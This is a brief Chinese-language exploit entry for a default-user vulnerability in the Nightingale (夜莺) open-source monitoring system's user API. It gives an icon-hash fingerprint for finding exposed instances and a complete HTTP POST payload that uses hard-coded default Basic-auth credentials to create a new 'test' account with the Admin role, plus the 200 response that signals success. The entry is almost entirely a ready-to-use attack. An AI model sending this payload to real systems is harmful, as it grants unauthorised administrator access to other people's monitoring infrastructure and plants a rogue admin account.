# 夜莺开源监控系统user接口存在默认用户漏洞

夜莺开源监控系统user接口 ｜ 其他 ｜ —
- **指纹**：`icon_hash="-2047686847"`
- **请求**：`GET /v1/n9e/users HTTP/1.1`

**Payload**
```
POST /v1/n9e/users HTTP/1.1
Host:
Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ==
Content-Type: application/json
Content-Length: 61
{"Username":"test","Password":"test","Roles":["Admin"]}
```
- **响应特征**：200